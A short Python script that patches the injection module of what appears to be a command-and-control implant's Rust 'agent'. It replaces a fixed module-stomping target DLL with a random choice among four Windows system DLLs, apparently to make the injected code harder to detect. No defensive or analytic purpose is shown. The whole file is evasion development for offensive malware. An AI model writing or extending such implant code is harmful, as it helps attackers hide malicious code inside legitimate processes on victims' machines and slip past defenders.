import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Replace hardcoded amstream.dll with a random choice
stomp_target = """        let dlls = ["amstream.dll", "credssp.dll", "wkscli.dll", "samcli.dll"];
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let stomp_target = dlls[rng.gen_range(0..dlls.len())];"""

# Find where it says: let stomp_target = "amstream.dll";
# but we might just replace it.
text = re.sub(r'let stomp_target\s*=\s*"[^"]+";', stomp_target, text)

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

